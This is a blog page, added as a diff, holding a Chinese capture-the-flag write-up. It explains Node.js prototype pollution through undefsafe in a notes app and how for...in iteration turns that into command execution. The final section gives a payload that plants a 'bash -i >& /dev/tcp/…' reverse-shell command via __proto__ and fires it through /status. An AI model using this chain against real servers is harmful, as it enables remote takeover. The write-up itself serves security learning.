@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"550532788.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x00 前言​    这就是传说中的网鼎杯吗？受教惹。幸好我们3个人人都没凑齐，只是为了看题目而打比赛的，要不然非要被这比赛给气死。就这么多吧，总结一下学到的东西。 涉及知识点： 1.Nodejs的原型链污染 2.js的遍历特性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="青龙组Notes">
+<meta property="og:url" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/index.html">
+<meta property="og:site_name" content="Cxlover&#39;s blog">
+<meta property="og:description" content="0x00 前言​    这就是传说中的网鼎杯吗？受教惹。幸好我们3个人人都没凑齐，只是为了看题目而打比赛的，要不然非要被这比赛给气死。就这么多吧，总结一下学到的东西。 涉及知识点： 1.Nodejs的原型链污染 2.js的遍历特性">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511112835792.png">
+<meta property="og:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511113249038.png">
+<meta property="og:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511114936489.png">
+<meta property="article:published_time" content="2020-05-11T04:01:10.004Z">
+<meta property="article:modified_time" content="2020-05-11T04:01:10.004Z">
+<meta property="article:author" content="Cxlover">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511112835792.png">
+
+<link rel="canonical" href="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>青龙组Notes | Cxlover's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cxlover's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section">Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section">Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://550532788.github.io/2020/05/11/%E9%9D%92%E9%BE%99%E7%BB%84Notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://blog-static.cnblogs.com/files/cioi/avatar.gif">
+      <meta itemprop="name" content="Cxlover">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cxlover's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          青龙组Notes
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-11 12:01:10" itemprop="dateCreated datePublished" datetime="2020-05-11T12:01:10+08:00">2020-05-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    这就是传说中的网鼎杯吗？受教惹。幸好我们3个人人都没凑齐，只是为了看题目而打比赛的，要不然非要被这比赛给气死。就这么多吧，总结一下学到的东西。</p>
+<p>涉及知识点：</p>
+<p>1.Nodejs的原型链污染</p>
+<p>2.js的遍历特性</p>
+<a id="more"></a>
+
+<h3 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a><code>0x01</code> 源码</h3><p>​    这题直接给了附件，但是我下载不了，幸好队友下载下来了。直接看源码吧。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">'undefsafe'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">'child_process'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Notes</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.owner = <span class="string">"whoknows"</span>;</span><br><span class="line">        <span class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);			<span class="comment">//id:__proto__  author:cioi raw:shell</span></span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a><code>0x02</code> 审计</h3><h4 id="1-原型链污染"><a href="#1-原型链污染" class="headerlink" title="1.原型链污染"></a>1.原型链污染</h4><p>​    这里可以直接看<code>Notes</code>类，发现使用了<code>undefsafe</code>。<a href="https://www.sogou.com/link?url=hedJjaC291M94sQej51f1MOnl7gebL35HIbTdRaPkHe_Jn-S4XBQ-g.." target="_blank" rel="noopener">复习一下<code>undefsafe</code>的使用方法吧</a>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// modified object</span></span><br><span class="line"><span class="keyword">var</span> res = undefsafe(object, <span class="string">'a.b.0'</span>, <span class="number">10</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">console</span>.log(object); <span class="comment">// &#123; a: &#123; b: [10, 2, 3] &#125; &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(res); <span class="comment">// 1 - previous value</span></span><br></pre></td></tr></table></figure>
+
+<p>​    可以看到这里是可以覆盖变量的。那我们就有了原型链污染的基础。我们考虑下面的代码:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// modified object</span></span><br><span class="line"><span class="keyword">var</span> res = undefsafe(object, <span class="string">'__proto__.test'</span>, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">console</span>.log(object); <span class="comment">// &#123; a: &#123; b: [1, 2, 3] &#125; &#125;    object.__proto__.test=10</span></span><br></pre></td></tr></table></figure>
+
+<p>​    从而造成原型链污染。</p>
+<p>​    既然原型链污染可以造成，那么怎么使用就是我们接下来想要知道的了。继续向下审计，发现有这样一串代码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>​    分析代码发现在<code>/status</code>路由下可以造成命令执行，但是只会执行<code>commands</code>数组中的变量，而这个数组我们是完全无法直接操纵的？那么怎么才可以执行我们想要的命令呢？那就要涉及到下面的知识了。</p>
+<h4 id="2-js的遍历特性"><a href="#2-js的遍历特性" class="headerlink" title="2.js的遍历特性"></a>2.js的遍历特性</h4><p>​    相信大多数师傅都知道这个东西，但是我还是说一下吧。</p>
+<p>​    这一题目使用<code>for(let index in commands)</code>进行数组的遍历，从而将这个数组中的命令执行。但是这种方法真的安全吗？可能在别的语言中是安全的，但是<code>js</code>并不是这样的，考虑如下代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="keyword">var</span> a = &#123;<span class="string">"cioi"</span>:<span class="string">"nya!"</span>&#125;;</span><br><span class="line">a.__proto__.cioier = <span class="string">"cioier!nya!"</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(index);</span><br><span class="line">	<span class="built_in">console</span>.log(commands[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    猜一下控制台的运行结果是什么？</p>
+<p><img src="%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511112835792.png" alt="image-20200511112835792"></p>
+<p>​    为什么呢？因为<code>commands</code>和<code>a</code>其实都是对象。而他们的原型是相同的。所以你赋值<code>a</code>会出现下面的情况。</p>
+<p><img src="%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511113249038.png" alt="image-20200511113249038"></p>
+<p>​    可以看到造成了原型链污染。但是即便如此<code>commands</code>对象中还是没有<code>cioier</code>这个变量啊。为什么会用<code>for</code>循环遍历出一个<code>cioier</code>来？当然，我也不太明白，只知道这是<code>js</code>的一个特性。遍历时会把原型链上的东西也带上，这个之后还是要看一下。就先记住吧。</p>
+<p>​    然后我们可以利用这一点来构造<code>payload</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先去&#x2F;edit_note </span><br><span class="line">POST json格式的 &#123;&quot;raw&quot;:&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.58.111&#x2F;3333 0&gt;&amp;1&quot;,&quot;id&quot;:&quot;__proto__&quot;,&quot;author&quot;:&quot;cioier&quot;&#125;</span><br><span class="line">然后去访问 &#x2F;status 就可反弹shell的。</span><br></pre></td></tr></table></figure>
+
+<p>​    可以写一个简单的脚本更方便，不过我就直接手做了。弹到<code>shell</code>后直接获取<code>flag</code>。</p>
+<p><img src="%E9%9D%92%E9%BE%99%E7%BB%84Notes.assets/image-20200511114936489.png" alt="image-20200511114936489"></p>
+<h3 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a><code>0x03</code> 结语</h3><p>​    还是比较简单的一道题目。师傅们可以找我来玩，一个人的<code>WEB</code>好无聊的说。</p>
+<p>QQ:550532788</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/17/%5BSCTF2019%5DFlag%20Shop/" rel="prev" title="[SCTF2019]Flag Shop">
+      <i class="fa fa-chevron-left"></i> [SCTF2019]Flag Shop
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
